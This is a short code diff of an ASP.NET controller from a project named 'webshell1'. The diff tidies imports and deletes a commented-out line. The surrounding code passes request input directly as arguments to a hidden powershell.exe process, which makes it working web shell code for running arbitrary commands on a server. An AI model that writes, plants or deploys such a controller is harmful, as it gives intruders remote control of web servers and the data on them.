@@ -1,11 +1,9 @@
 ﻿using Microsoft.AspNetCore.Mvc;
 using Microsoft.EntityFrameworkCore;
-using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
-using System.Text;
 using System.Threading.Tasks;
 
 namespace webshell1.Controllers
@@ -61,7 +59,6 @@ namespace webshell1.Controllers
         {
             Process process = new Process();
             process.StartInfo.FileName = "powershell.exe";
-            //process.StartInfo.Arguments = string.Concat("/C ", input);
             process.StartInfo.Arguments = input;
             process.StartInfo.UseShellExecute = false;
             process.StartInfo.CreateNoWindow = true;
